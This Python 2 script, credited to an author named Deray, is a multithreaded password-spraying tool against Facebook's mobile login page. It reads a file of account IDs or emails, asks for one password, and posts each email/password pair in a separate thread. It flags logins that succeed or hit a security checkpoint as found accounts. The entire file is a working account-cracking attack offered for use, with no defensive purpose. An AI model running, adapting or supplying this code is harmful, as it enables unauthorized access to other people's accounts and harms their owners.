#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import re
import sys
import bs4
import requests
import threading
from data.color import *
from data import cache
cache.cleanCache()

initz = 0
threads = []
_found = []
_cekpoin = []

class asuBrute(threading.Thread):
	def __init__(self,*args):
		threading.Thread.__init__(self)
		self._urls = args[0]
		self._email = args[1]
		self._pasw = args[2]
		self._many = args[3]
		self._submit=args[4]
		
	def run(self):
		global initz,_found,_cekpoin
		initz+=1
		try:
			self._req=requests.post(self._urls,
				data={
							"email":self._email,
							"pass":self._pasw,
							"login":self._submit
						}
			).url
			if "save-device" in self._req or "m_sess" in self._req:
				print "\r[+] Found     : %s -> %s"%(self._email,
				self._pasw)
				_found.append(" | %s -> %s"%(self._email,
				self._pasw))
			if "checkpoint" in self._req:
				_cekpoin.append(" - %s - %s"%(self._email,
				self._pasw))
			print "\r[%s*%s] Cracking %s/%s"%(G,N,initz,
			self._many),;sys.stdout.flush()
			
		except:pass

class _prepares:
	def __init__(self):
		self._url = "https://mbasic.facebook.com/login"
		try:
			self.__wordlist()
		except Exception as __errors__:
			print("\r%s[!]%s %s"%(R,N,__errors__))
	
	def __wordlist(self):
		self._words=raw_input("\r[%s*%s] List ID: "%(C,N))
		if (self._words == ""):
			return self.__wordlist()
		try:
			self._openFile()
		except Exception as __errors__:
			print("\r%s[!]%s %s"%(R,N,__errors__))
			return self.__wordlist()
			
	def _generarePasswd(self):
		self._passwords = raw_input("\r[%s*%s] Password to crack: "%(R,N))
		if (self._passwords == ""):
			return self._generarePasswd()
		self._run()
		
	def _openFile(self):
		self.Files = open(self._words).read().splitlines()
		self._generarePasswd()

	def _run(self):
		global threads,_found
		tred=0
		self._regeg = bs4.BeautifulSoup(
			requests.get(self._url).text,
		features="html.parser")
		for _findSubmit in self._regeg("input"):
			if "login" in _findSubmit["name"]:
				self._submit = _findSubmit["value"]
				break
		toket=[]
		for _run_ in self.Files:
			toket.append(_run_)
		for _run_ in toket:
			_t=asuBrute(self._url,_run_,self._passwords,
			len(self.Files),self._submit)
			threads.append(_t)
			
		for _t in threads:
			_t.start()
			
		for _t in threads:
			_t.join()
			
		if (len(_found) !=0):
			print("\n%s[*]%s Found %s"%(G,N,len(_found)))
			for x in _found:
				print x
				
		else:
			print("\n%s[-] %sno result found :')"%(R,N))
		if (len(_cekpoin) !=0):
			print("\n%sCheckpoint %s"%(warn,len(_cekpoin)))
			for _ngentot in _cekpoin:
				print("%s%s%s"%(O,_ngentot,N))
